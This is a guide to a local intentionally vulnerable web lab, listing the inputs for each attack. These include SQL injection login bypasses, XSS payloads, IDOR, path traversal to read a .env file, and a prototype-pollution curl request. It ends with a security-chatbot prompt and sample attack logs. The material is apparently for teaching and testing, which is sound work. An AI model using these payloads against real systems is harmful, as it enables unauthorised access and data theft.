# What to Input for Each Attack

Use these payloads only on your local `apps/vuln-lab`.

## Before you start

- Make sure lab runs in vulnerable mode: `LAB_MODE=vulnerable`
- Open storefront: `http://127.0.0.1:3100`

## What to input for each attack

- **SQLi auth bypass (login form)**

  - In **Account Login**:
    - Username: `admin`
    - Password: `' OR '1'='1`
  - Or:
    - Username: `admin' --`
    - Password: `anything`
  - Expected: login success / admin-like welcome.

- **Brute-force pattern (login form)**

  - Try 5-10 wrong logins quickly, for example:
    - `admin / 123456`
    - `admin / password`
    - `admin / letmein`
  - Then try weak valid credentials:
    - `admin / password123`
  - Expected: failed attempts logged, then successful weak-credential login.

- **Reflected XSS (search bar / URL query)**

  - In search input, try:
    - `<img src=x onerror=alert('rxss')>`
  - Or directly URL:
    - `http://127.0.0.1:3100/?q=%3Cimg%20src%3Dx%20onerror%3Dalert('rxss')%3E`
  - Expected: payload reflected in search summary and JS execution in vulnerable mode.

- **Stored XSS (comment form)**

  - In **Community Notes** comment:
    - `<img src=x onerror=alert('stored-xss')>`
  - Post it, then reload comments/page.
  - Expected: payload persists and executes when comments render.

- **IDOR (profile lookup)**

  - In **Profile Lookup**:
    - Viewer ID: `1001`
    - Customer ID: `1002`
  - Expected: another user profile returned in vulnerable mode.

- **Broken access control (URL tampering)**

  - Open:
    - `http://127.0.0.1:3100/lab/admin?role=user&debug=true`
  - Expected: admin panel access/bypass behavior.

- **Path traversal (download param tampering)**

  - Open:
    - `http://127.0.0.1:3100/lab/download?file=../../.env`
  - Expected: traversal attempt behavior is triggered (simulated response).

- **Security misconfiguration / debug exposure**

  - Open:
    - `http://127.0.0.1:3100/lab/debug/config`
  - Expected: debug config leakage in vulnerable mode.

- **Unsafe deserialization / prototype-pollution style import (via curl)**

  - Run:
    - `curl -X POST http://127.0.0.1:3100/lab/import-config -H "Content-Type: application/json" -d '{"payload":"{\"__proto__\":{\"isAdmin\":true}}"}'`
  - Expected: unsafe merge behavior path triggered.

- **Weak token generation**

  - Open:
    - `http://127.0.0.1:3100/lab/token`
  - Expected: predictable/weak token returned.

- **Outdated component inventory**
  - Open:
    - `http://127.0.0.1:3100/lab/component/version`
  - Expected: simulated outdated dependency info.

### Simple incident input for chatbot

You are a website security assistant for non-technical users.
Task: detect if this is an active attack, then give a SHORT warning and immediate protection steps.
Critical rules:

- Do NOT explain your reasoning process.
- Do NOT say phrases like 'I will analyze' or 'I will first'.
- Start directly with: ALERT: ...
  Output format:

1. ALERT (one sentence, plain language)
2. WHAT HAPPENED (2-3 bullets)
3. IMMEDIATE ACTIONS (max 5 bullets, concrete steps for website owner)
4. NEXT 24H CHECKLIST (max 4 bullets)
   Keep it concise and practical. Avoid jargon where possible.

Scenario hint: Auto-detected reflectedXss
System logs from vulnerable website:
[2026-02-25T05:16:33.288Z] req=7978e749-3fe3-48a0-9fe2-49a374232ff9 GET /lab/api/products?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%27rxss%27)%3E status=200 latency_ms=2 attack_detected=true scenario=reflectedXss risk=XSS payload="<img src=x onerror=alert('rxss')>"
[2026-02-25T05:14:54.879Z] req=8fa75262-ff46-463f-8830-d43133d3a50e POST /lab/auth/login status=200 latency_ms=20 attack_detected=true scenario=sqliLogin risk=SQLi payload="admin:' OR '1'='1"
